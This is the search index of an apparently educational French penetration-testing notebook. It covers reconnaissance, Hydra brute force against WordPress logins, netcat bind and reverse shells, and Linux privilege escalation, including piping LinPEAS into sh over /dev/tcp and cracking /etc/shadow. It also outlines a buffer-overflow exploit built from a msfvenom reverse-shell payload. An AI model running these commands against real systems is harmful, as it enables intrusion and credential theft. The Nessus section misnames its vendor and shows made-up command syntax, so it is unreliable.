{"config":{"lang":["fr"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to MkDocs","text":"<p>For full documentation visit mkdocs.org.</p>"},{"location":"#commands","title":"Commands","text":"<ul> <li><code>mkdocs new [dir-name]</code> - Create a new project.</li> <li><code>mkdocs serve</code> - Start the live-reloading docs server.</li> <li><code>mkdocs build</code> - Build the documentation site.</li> <li><code>mkdocs -h</code> - Print help message and exit.</li> </ul>"},{"location":"#project-layout","title":"Project layout","text":"<pre><code>mkdocs.yml    # The configuration file.\ndocs/\n    index.md  # The documentation homepage.\n    ...       # Other markdown pages, images and other files.\n</code></pre>"},{"location":"Action%20sur%20objectif/","title":"Rapport","text":"<p>Le rapport doit inclure deux parties, une partie dite \"non technique\" et une partie technique.</p>"},{"location":"Action%20sur%20objectif/#partie-non-technique","title":"Partie \"Non technique\" :","text":""},{"location":"Action%20sur%20objectif/#partie-technique","title":"Partie Technique :","text":""},{"location":"Attaquer%20la%20cible/","title":"Brute Force","text":""},{"location":"Attaquer%20la%20cible/#hydra","title":"Hydra","text":"<ul> <li> <p>Permet d\u2019obtenir le nom d'utilisateur avec un dictionnaire : <pre><code>sudo hydra -L &lt;Dictionnaire&gt; -p &lt;mot de passe&gt; &lt;IP&gt; http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=Invalid username'\n</code></pre></p> </li> <li> <p>Permet d\u2019obtenir le mot de passe d'un utilisateur : <pre><code>sudo hydra -l &lt;Username&gt; -P &lt;Dictionnaire&gt; &lt;IP&gt; http-post-form '/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In:F=is incorrect'\n</code></pre></p> </li> </ul>"},{"location":"Attaquer%20la%20cible/#installation-de-la-payload","title":"Installation de la Payload","text":"<p>Sites web :  - https://packetstormsecurity.com/  - https://pentestmonkey.net/</p>"},{"location":"Attaquer%20la%20cible/#reverse-shell-php","title":"Reverse Shell PHP","text":"<p>T\u00e9l\u00e9charger le reverse Shell PHP : https://pentestmonkey.net/tools/web-shells/php-reverse-shell  Puis changer les lignes 49 et 50</p>"},{"location":"Attaquer%20la%20cible/#cc","title":"C&amp;C","text":""},{"location":"Attaquer%20la%20cible/#netcat","title":"Netcat","text":""},{"location":"Attaquer%20la%20cible/#listener","title":"Listener","text":"<pre><code>nc -nlvp 666\n</code></pre> arg description l listener n pas de resolution de nom v verbose p port ### Bind Shell L'attaquant initie la connexion \u00e0 la victime Victime : - Linux : <pre><code>nc -nlvp 666\n</code></pre> - Windows : <pre><code>ncat -nlvp 666 -e cmd.exe\n</code></pre> <p>attaquant :  <pre><code>nc -lv 666\n</code></pre></p>"},{"location":"Attaquer%20la%20cible/#reverse-shell","title":"Reverse Shell","text":"<ol> <li>Permet d\u2019\u00e9couter sur le port  <code>sudo nc -nlvp 666</code></li> <li>Faire ex\u00e9cuter le reverse Shell</li> <li>Une fois le reverse Shell ex\u00e9cut\u00e9 et ouvert dans le terminal, ex\u00e9cuter la commande   <code>import pty;pty.spawn(\"/bin/bash\")'</code> permet d'invoquer un Shell interactif. <p>Attention : la commande pr\u00e9c\u00e9dente peut \u00eatre d\u00e9tect\u00e9 et alert\u00e9 le SOC</p> </li> </ol>"},{"location":"Attaquer%20la%20cible/#elevation-de-privilege","title":"\u00c9l\u00e9vation de privil\u00e8ge","text":"<p>https://an0nud4y.com/notes/lin-priv-esc/</p>"},{"location":"Attaquer%20la%20cible/#linux","title":"Linux","text":""},{"location":"Attaquer%20la%20cible/#enumeration","title":"\u00c9num\u00e9ration","text":""},{"location":"Attaquer%20la%20cible/#systeme","title":"Syst\u00e8me","text":"<pre><code>hostname\nuname -a # detail de la machine\ncat /proc/version # permet de d\u00e9terminer la version du kernel\nlscpu # detail du cpu\nps aux | grep root # liste les processus lancer par root\ncat /etc/issue # permet de d\u00e9terminer la version de l'os\npspy (https://github.com/DominicBreuker/pspy/releases)\necho $PATH \n</code></pre>"},{"location":"Attaquer%20la%20cible/#utilisateur","title":"Utilisateur","text":"<pre><code>whoami # affiche l'utilisateur en cours d'utilisation\necho $USER # affiche l'utilisateur en cours d'utilisation(Stealth)\nid # id de l'utilisateur\nsudo -l # affiche les commande avec les droit sudo pour l'utilisateur\ncat /etc/passwd # list les utilisateurs\ncut -d \":\" -f 1 /etc/passwd #list users\n</code></pre>"},{"location":"Attaquer%20la%20cible/#reseau","title":"R\u00e9seau","text":"<pre><code>ifonfig\nip a\nip route \narp -a \nip neigh\nnetstat\n</code></pre>"},{"location":"Attaquer%20la%20cible/#suid","title":"SUID","text":"<p>Pour lister les commande avec les droits root : <pre><code>find / -user root -perm -4000 2&gt; /dev/null\n</code></pre></p> <p>Pour lister les commande avec les droits au niveau du groupe : <pre><code>find / -user root -perm -2000 2&gt; /dev/null\n</code></pre></p> <p>Pour lister les commande ex\u00e9cutable en tant que sudo par l'utilisateur actuel <pre><code>sudo -l\n</code></pre></p> <p>https://gtfobins.github.io/</p>"},{"location":"Attaquer%20la%20cible/#shadow","title":"Shadow","text":"<p><code>/etc/shadow</code> <code>/etc/passwd</code></p> <pre><code>unshadow passwd.txt shadow.txt &gt; passwords.txt\n\njohn --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt\n</code></pre>"},{"location":"Attaquer%20la%20cible/#script-dautomatisation","title":"Script d'automatisation","text":""},{"location":"Attaquer%20la%20cible/#linpeas","title":"LinPeas","text":"<p>https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS LinPeas permet de d\u00e9tect\u00e9 les \u00e9l\u00e9vation de privil\u00e8ge possible <pre><code># Sur la machine cible si elle a acc\u00e8s \u00e0 internet\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\n\n# En local\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\n\nsudo python3 -m http.server 80 #Hote\ncurl 192.168.56.1/linpeas.sh | sh #Cible\n\n# Sans curl\nsudo nc -q 5 -lvnp 80 &lt; linpeas.sh #Hote\ncat &lt; /dev/tcp/10.10.10.10/80 | sh #Cible\n\n# Execution en m\u00e9moire et envoie du resultat \u00e0 l'hote\nnc -lvnp 9002 | tee linpeas.out #Hote\ncurl 192.168.56.1:80/linpeas.sh | sh | nc 10.10.14.20 9002 #Cible\n</code></pre></p>"},{"location":"Attaquer%20la%20cible/#linuxprivchecker","title":"Linuxprivchecker","text":"<p>https://github.com/linted/linuxprivchecker</p>"},{"location":"Attaquer%20la%20cible/#linux-smart-enumeration","title":"Linux-smart-enumeration","text":"<p>https://github.com/diego-treitos/linux-smart-enumeration</p>"},{"location":"Attaquer%20la%20cible/#linux-exploit-suggester","title":"Linux-exploit-suggester","text":"<p>https://github.com/The-Z-Labs/linux-exploit-suggester</p>"},{"location":"Attaquer%20la%20cible/#linenum","title":"LinEnum","text":"<p>https://github.com/rebootuser/LinEnum</p>"},{"location":"Attaquer%20la%20cible/#kernel-exploits","title":"Kernel Exploits","text":""},{"location":"Attaquer%20la%20cible/#methodologie","title":"M\u00e9thodologie","text":"<ol> <li>Identifiez la version du noyau</li> <li>Rechercher et trouver un code d'exploitation pour la version du noyau du syst\u00e8me cible</li> <li>Ex\u00e9cutez l'exploit</li> </ol> <p>https://github.com/lucyoa/kernel-exploits</p>"},{"location":"Attaquer%20la%20cible/#1-identification","title":"1. Identification","text":"<p>![[4. Attaquer la cible#Syst\u00e8me]]</p>"},{"location":"Attaquer%20la%20cible/#2-recherche-dexploit","title":"2. Recherche d'exploit","text":"<p>https://www.exploit-db.com/</p>"},{"location":"Attaquer%20la%20cible/#3-exploitation","title":"3. Exploitation","text":"<pre><code># Installation de l'exploit sur la machine\nsudo python3 -m http.server 80 #Hote\ncurl 10.9.151.128/37292.c #Cible\n</code></pre>"},{"location":"Attaquer%20la%20cible/#windows","title":"Windows","text":""},{"location":"Attaquer%20la%20cible/#enumeration_1","title":"Enum\u00e9ration","text":""},{"location":"Attaquer%20la%20cible/#systeme_1","title":"Syst\u00e8me","text":"<pre><code>systeminfo\nwmic qfe\nwmic qfe get Caption,Description,HotFixID,InstalledOn # Patchs\nwmic logicaldisk get caption,description,providername\n</code></pre> <pre><code>Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid}\nGet-Hotfix -description \"Security update\"\n</code></pre>"},{"location":"Attaquer%20la%20cible/#utilisateur_1","title":"Utilisateur","text":"<pre><code>whoami # affiche l'utilisateur en cours d'utilisation\nwhoami /priv\nwhoami /groups\nnet user &lt;username&gt;\nnet localgroup &lt;user&gt;\n</code></pre>"},{"location":"Attaquer%20la%20cible/#reseau_1","title":"R\u00e9seau","text":"<pre><code>ifonfig\nip a\nip route \narp -a \nip neigh\nnetstat\n</code></pre>"},{"location":"Recon/","title":"Scan R\u00e9seau","text":""},{"location":"Recon/#ping","title":"PING","text":""},{"location":"Recon/#ttl","title":"TTL","text":"TTL Systeme 64 Linux 128 Windows 255 Cisco IOS"},{"location":"Recon/#nmap","title":"NMAP","text":"Fonction commande Scan all (utilise des script pour d\u00e9termin\u00e9 pour obtenir le maximum d'information) <code>nmap -A &lt;plage IP&gt;</code> Scan r\u00e9seau <code>nmap -sP &lt;ip&gt;</code> Scan syn <code>nmap -sS&lt; ip&gt;</code> Scan TCP <code>nmap -sT &lt;ip&gt;</code> Scan TCP range <code>nmap -sT -p- &lt;ip&gt;</code> Scan Version du service <code>nmap -sV &lt;ip&gt;</code> Scan de l'OS et des services <code>nmap -sO &lt;ip&gt;</code> Scan en verbose avec un script <code>nmap -v --script vuln &lt;ip&gt;</code> Scan Xmas <code>nmap -sX &lt;ip&gt;</code> Scan NULL <code>nmap -sN &lt;ip&gt;</code> Scan FIN <code>nmap -sF &lt;ip&gt;</code> Scan UDP <code>nmap -sU &lt;ip&gt;</code>"},{"location":"Recon/#net-discover","title":"Net Discover","text":"<p>On fait un scan ARP. Un scan ARP ne peux pas \u00eatre bloqu\u00e9 <code>sudo netdiscover -i &lt;carte reseau&gt; -r &lt;plage IP&gt;</code></p>"},{"location":"Recon/#partage-reseau","title":"Partage r\u00e9seau","text":"<ul> <li>\u00c9num\u00e8re les partages: <code>nmblookup -A &lt;ip&gt;</code></li> <li>Map les partages: <code>smbmap -H &lt;ip&gt;</code></li> <li>Client samba: <code>smbclient -L ///&lt;ip&gt; -W &lt;workgroup&gt; -U &lt;user&gt;</code></li> <li>Client RPC: <code>rpclcient -U \"\" &lt;ip&gt;</code></li> </ul>"},{"location":"Recon/#data-base","title":"Data Base","text":""},{"location":"Recon/#redis","title":"Redis","text":"<p>port : 6379/tcp - se connecter \u00e0 Redis  <pre><code> redis-cli -h &lt;hostname/IP&gt;\n</code></pre></p> <pre><code>SELECT &lt;index&gt; #choisir une base\nINFO #detail du serveur redis\nDBSIZE #nb de keys\nKEYS * #lister les keys\nget \"flag\" #lire la value de la key \"flag\"\n</code></pre>"},{"location":"Recon/#web","title":"Web","text":"<ul> <li>T\u00e9l\u00e9charger les fichier un-\u00e0-un pour les analyser : <code>wget &lt;ip serveur&gt;/&lt;emplacement du fichier&gt;</code></li> <li>Lister arborescence d'un serveur web : <code>dirb &lt;ip serveur&gt;</code></li> <li>Lister l'arborescence d'un serveur web : <code>gobuster dir -u http://10.10.133.151 -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt</code></li> <li>Lister l'arborescence d'un serveur web en cherchant les .php: <code>gobuster dir -u http://10.10.133.151 -w /usr/share/seclists/Discovery/Web-Content/common.txt -x .php</code></li> <li>trier un fichier par ordre alphabet et supp. les doublon <code>cat &lt;file&gt; | sort | uniq &gt; &lt;out_file&gt;</code></li> <li>lister les sous-domaine pr\u00e9sent sur une page <code>curl &lt;site&gt; | grep \"href=\" |cut -d \"/\" -f 3 | grep \"\\.\" | cut -d '\"' -f 1 | sort -u</code></li> <li><code>curl &lt;site&gt; | grep \"href=\" | grep -o 'https://[^\"]*' | cut -d \"/\" -f 3 | sort -u</code></li> <li> <p><code>for url in $(cat liste.txt); do host$url; done | grep \"has adress\" | cut -d \" \" -f 4 | sort -u</code></p> </li> <li> <p><code>curl &lt;site&gt; | grep \"href=\" | grep \"\\.megacorpone\" | grep -v \"www*\\.megacorpone\\.com\" | awk -F \"http://\" '{print $2}' | cut -d '/' -f 1 |cut -d '\"' -f 1 | uniq</code></p> </li> <li><code>for url in $(cat lien.txt); do host $url;done | grep \"has address\" | cut -d \" \" -f 4 &gt; ip.txt</code></li> </ul>"},{"location":"Recon/#dns","title":"DNS","text":"<ul> <li>Transfert de Zone DNS : <code>dig -t axfr @dns.bigbusiness.loc bigbusiness.loc</code> </li> </ul>"},{"location":"Recon/#windows","title":"Windows","text":""},{"location":"Recon/#powershell","title":"Powershell","text":"<ul> <li>ping : <pre><code>tnc 172.31.24.20\n</code></pre></li> <li>ping d'une plage d'adresse : <pre><code>9..11 | % {tnc 172.31.24.$_}\n</code></pre></li> <li>tester le service RDP avec r\u00e9sultat dans un fichier : <pre><code>tnc 172.31.24.20 rdp | Out-File c:\\users\\pslearner\\challenge1.txt\n</code></pre></li> <li>scan de ports avec liste : <pre><code>$ports = 22,53,80,445,3389\n$ports | ForEach-Object {$port = $_; if (tnc 172.31.24.20 -Port $port ) {\"$port is open\" } else {\"$port is closed\"} }\n</code></pre></li> <li>scan de tout les ports : <pre><code>1..65535 | % {tnc 172.31.24.10 -Port $_}\n</code></pre></li> <li>cr\u00e9er une nouvelle connexion par WinRM, se connecter et la cl\u00f4ture : <pre><code>New-PSSession 172.31.24.20\n\nEnter-PSSession 172.31.24.20\n\nExit-PSSession\n</code></pre></li> <li>lister les processus sur Windows :  <pre><code>Get-Process | Select-Object -Property ProcessName,Id,Path\n</code></pre></li> <li>chercher un fichier sp\u00e9cifique :  <pre><code>gci c:\\users\\public\\desktop\\LAB_FILES\\ -Include *.txt,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern \"Pwd\"\n</code></pre></li> <li>lister toutes les informations sur les ressources partag\u00e9es <pre><code>net share  | Out-File c:\\users\\pslearner\\datacollection.txt -Append\n</code></pre></li> <li>lister toutes les donn\u00e9es de connexion de session r\u00e9seau <pre><code>net session | Out-File c:\\users\\pslearner\\datacollection.txt -Append\n</code></pre></li> <li>lister toutes les informations utilisateur <pre><code>Get-LocalUser | Select * | Out-File c:\\users\\pslearner\\datacollection.txt -Append\n</code></pre></li> <li>lister toutes les informations sur les services <pre><code>get-service | Out-File c:\\users\\pslearner\\datacollection.txt -Append\n</code></pre></li> <li>lister toutes les informations de la carte r\u00e9seau <pre><code>get-netadapter | Out-File c:\\users\\pslearner\\datacollection.txt -Append\n</code></pre></li> <li>lister toutes les commandes disponibles pour un utilisateur sur cette machine: <pre><code>get-command | Out-File c:\\users\\pslearner\\availablecommands.txt\n</code></pre></li> </ul>"},{"location":"Recon/#wireshark","title":"Wireshark","text":"<p>Wireshark en CLI : <code>tshark -i &lt;interface_name&gt;</code></p>"},{"location":"Scan%20de%20Vuln%C3%A9rabilit%C3%A9/","title":"3. Scan de Vuln\u00e9rabilit\u00e9","text":""},{"location":"Scan%20de%20Vuln%C3%A9rabilit%C3%A9/#nikto","title":"Nikto","text":"<p>Scanning a website with Nikto can be done using the following command in your terminal or command prompt: </p> <p><pre><code>nikto -p &lt;target_website&gt;\n</code></pre> Replace <code>&lt;target_website&gt;</code> with the URL of the website you want to scan. For example, if you want to scan <code>www.example.com</code>, the command would be:</p> <p><pre><code>nikto -p www.example.com\n</code></pre> This will start a Nikto scan on the target website and display any vulnerabilities that are found.</p>"},{"location":"Scan%20de%20Vuln%C3%A9rabilit%C3%A9/#wapiti","title":"Wapiti","text":"<p>Pour scanner un site Web avec Wapiti, vous pouvez utiliser la suite d'outils Nessus. Nessus est l'un des outils les plus populaires pour le scan de sites web et il supporte une grande vari\u00e9t\u00e9 de plugins pour tester les fonctionnalit\u00e9s de ce type.</p> <p>Voici un exemple de commande que vous pouvez utiliser pour scanner un site Web avec Nessus : <pre><code>nessus -p 80,443 --script http-vuln --host www.example.com\n</code></pre> Dans cet exemple, <code>-p 80,443</code> sp\u00e9cifie les ports \u00e0 scanner, <code>--script http-vuln</code> indique le script \u00e0 utiliser pour tester les vuln\u00e9rabilit\u00e9s HTTP, et <code>--host www.example.com</code> sp\u00e9cifie l'h\u00f4te \u00e0 scanner.</p> <p>Vous pouvez remplacer les param\u00e8tres de cette commande par d'autres valeurs en fonction de votre besoin. Par exemple, vous pouvez ajouter des scripts suppl\u00e9mentaires pour tester d'autres types de vuln\u00e9rabilit\u00e9s, sp\u00e9cifier un autre h\u00f4te \u00e0 scanner, ou modifier les options du script HTTP-VULN.</p> <p>Pour plus d'informations sur la suite Nessus et les outils qu'elle contient, vous pouvez visiter le site Web de Rapid7, le cr\u00e9ateur de Nessus : https://www.rapid7.com/products/nessus/</p>"},{"location":"reverse-engineering/","title":"Reverse Engineering","text":""},{"location":"reverse-engineering/#reverse","title":"Reverse","text":"<ul> <li>Cr\u00e9ation d'un pattern d'une longueur de 800 <pre><code>/opt/metasploit/tools/exploit/pattern_create.rb -l 800\n</code></pre></li> <li>Envoie du pattern dans la section vuln\u00e9rable</li> <li>Lire la valeur de EIP dans le d\u00e9buggeur lorsque le programme \u00e0 plant\u00e9</li> <li>Calcul de l'offset <pre><code>/opt/metasploit/tools/exploit/pattern_offset.rb -l 800 -q &lt;value EIP&gt;\n</code></pre></li> <li>V\u00e9rifier que l'offset est correcte en \u00e9crivant  <code>offset * \"A\" + 4 * \"B\"</code> dans la section. La valeur de l'EIP doit \u00eatre <code>42424242</code></li> <li>v\u00e9rifier la place dispo pour la Payload, envoyant dans la section <code>offset * \"A\" + 4 * \"B\" + 80 * \"C\"</code>. Les \"C\" doivent \u00eatre \u00e9crit dans la m\u00e9moire.</li> <li>chercher une DLL qui n'est pas s\u00e9curis\u00e9(Rebase, ASLR : False) <pre><code>!mona modules\n</code></pre></li> <li>v\u00e9rifier la pr\u00e9sence d'une instruction dans une DLL et liste les adresses de o\u00f9 se trouve l'instruction JMPESP (l'opcode de JMPESP est <code>\\xff\\xe4</code> )  <pre><code>!mona find -s \"\\xff\\xe4\" -m slmfc.dll\n</code></pre></li> <li>Cr\u00e9ation d'un reverse shell <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=192.168.2.1  \nLPORT=666 -f c -e x86/shikata_ga_nai -b \"\\x00\\x0D\\xFF\"\n</code></pre></li> </ul> Param\u00e8tre Valeur Description -p windows/shell_reverse_tcp type de payload LHOST 192.168.2.1 adresse ip du listener LPORT 666 port du listener -f c export au format C -e x86/shikata_ga_nai encodeur -b \"\\x00\\x0D\\xFF\" liste des Badchar <ul> <li>Maintenant, cr\u00e9er l'exploit avec : <pre><code>offset + Adresse de JMPESP(invers\u00e9) + nb * NoP + Shellcode\n</code></pre></li> </ul>"}]}